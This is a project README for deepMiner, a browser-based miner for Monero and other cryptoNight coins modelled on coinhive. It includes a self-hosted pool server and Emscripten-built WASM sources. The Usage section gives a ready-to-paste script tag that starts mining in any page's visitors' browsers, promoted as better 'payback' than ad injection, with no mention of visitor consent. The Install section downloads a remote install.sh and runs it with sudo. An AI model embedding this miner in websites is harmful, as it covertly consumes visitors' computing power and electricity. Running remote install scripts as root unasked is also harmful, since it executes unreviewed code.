# deepMiner

![](https://raw.githubusercontent.com/deepwn/deepMiner/master/.github/banner.png)

* deepMiner (idea from coinhive.js) By evil7@deePwn
* Working on XMR(Monero) and ETN(Electroneum) personal wallet
* Eazy way mining in browsers & Nice payback than Ad-inject

## Support on

![](https://raw.githubusercontent.com/deepwn/deepMiner/master/.github/xmr.png) ![](https://raw.githubusercontent.com/deepwn/deepMiner/master/.github/etn.png)![](https://raw.githubusercontent.com/deepwn/deepMiner/master/.github/sumokoin.png)

* And All coins who follow `cryptoNight` / `cryptoNight v7` && pool connect in `JSONRPC2`
* Some coins used cryptoNote <https://cryptonote.org/coins/> (example: Monero / Electroneum /Sumokoin / Aeon ...)
* The whitebook: `cryptoNight.txt` and `cryptoNight.md`. Come from: <https://cryptonote.org/standards/>
* Technology: <https://cryptonote.org/inside/>

## Usage

* Add some javascript and write like this :

```html
<script src="https://deepool.net/lib/deepMiner.min.js"></script>
<script>
    var miner = new deepMiner.Anonymous('deepMiner_test').start();
</script>
```

* All done! XD~ Let's build our srv by self

## Install

```bash
curl https://raw.githubusercontent.com/deepwn/deepMiner/master/install.sh > install.sh
sudo sh install.sh
```

lib request: `*nodejs` / `*npm` / `?nginx`

useful pakages: `forever`

ssl support: <https://certbot.eff.org/>

OS pass: `ubuntu(debian)`

## API

Same like this: <https://coinhive.com/documentation/miner> (JUST javascript API)

## Update

Just go `/srv/deepMiner` and run `git pull`

DON'T forget backup your `config.json` !!!

## WASM support

We can see it's updated for v7 now. All sources in the folder `cryptonight-wasm`

You need install [Emscripten](https://github.com/kripken/emscripten) first, and run `./build.sh` to make this new wasm file up.

## Attention

Some VPS's can't find pool's IP. change your VPS's DNS will work.

SSL cert request default is `TRUE`. So use `certbot` or `acme.sh` to quick set.

Choice another pool which you wanna using: <https://github.com/timekelp/xmr-pool-choice>

## License

MIT <https://raw.githubusercontent.com/deepwn/deepMiner/master/LICENSE>

## Donate (Like this project <3)

| Coin | Address |
| :---: | :--- |
| BTC | `1HNkaBbCWcye6uZiUZFzk5aNYdAKWa5Pj9` |
| XMR | `41ynfGBUDbGJYYzz2jgSPG5mHrHJL4iMXEKh9EX6RfEiM9JuqHP66vuS2tRjYehJ3eRSt7FfoTdeVBfbvZ7Tesu1LKxioRU` |
